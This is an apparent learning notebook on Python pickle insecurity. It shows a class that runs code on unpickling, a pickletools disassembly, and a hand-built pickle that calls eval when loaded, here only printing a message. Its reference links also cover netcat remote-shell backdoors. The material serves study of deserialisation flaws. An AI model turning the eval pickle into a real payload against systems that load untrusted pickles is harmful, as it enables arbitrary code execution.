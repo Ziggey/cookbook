{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " - https://blog.nelhage.com/2011/03/exploiting-pickle/\n",
    " - https://docs.python.org/3/library/pickle.html#object.__reduce__\n",
    " - https://gist.github.com/freddyb/3360650\n",
    " - https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/\n",
    " - https://lincolnloop.com/blog/playing-pickle-security/\n",
    " - https://arp242.net/weblog/security-of-python's-pickle-and-marshal-modules\n",
    " - https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html\n",
    " - https://intoli.com/blog/dangerous-pickles/\n",
    " - https://docs.python.org/3/library/pickletools.html\n",
    " - https://jkeohan.wordpress.com/2010/04/30/using-netcat-to-spawn-a-remote-shell/\n",
    " - https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index\n",
    " - https://www.securesolutions.no/netcat-backdoor-without-e-and-mimicking-netcat-with-bash/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Bomb:\n",
    "    def __init__(self, name):\n",
    "        self.name = name\n",
    "\n",
    "    def __getstate__(self):\n",
    "        return self.name\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        self.name = state\n",
    "        print(f'Bang! From, {self.name}.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "b = Bomb('OB')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nBomb\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\nVOB\\np5\\nb.'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickled_bomb = pickle.dumps(b, protocol=0)\n",
    "pickled_bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, OB.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<__main__.Bomb at 0x2aa16f9c748>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unpickled_bomb = pickle.loads(pickled_bomb)\n",
    "unpickled_bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickletools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: c    GLOBAL     'copy_reg _reconstructor'\n",
      "   25: p    PUT        0\n",
      "   28: (    MARK\n",
      "   29: c        GLOBAL     '__main__ Bomb'\n",
      "   44: p        PUT        1\n",
      "   47: c        GLOBAL     '__builtin__ object'\n",
      "   67: p        PUT        2\n",
      "   70: N        NONE\n",
      "   71: t        TUPLE      (MARK at 28)\n",
      "   72: p    PUT        3\n",
      "   75: R    REDUCE\n",
      "   76: p    PUT        4\n",
      "   79: V    UNICODE    'OB'\n",
      "   83: p    PUT        5\n",
      "   86: b    BUILD\n",
      "   87: .    STOP\n",
      "highest protocol among opcodes = 0\n"
     ]
    }
   ],
   "source": [
    "pickletools.dis(pickled_bomb)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "pickled_bomb = b'c__builtin__\\neval\\n(Vprint(\"Bang! From, Evan.\")\\ntR.'\n",
    "pickle.loads(pickled_bomb)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
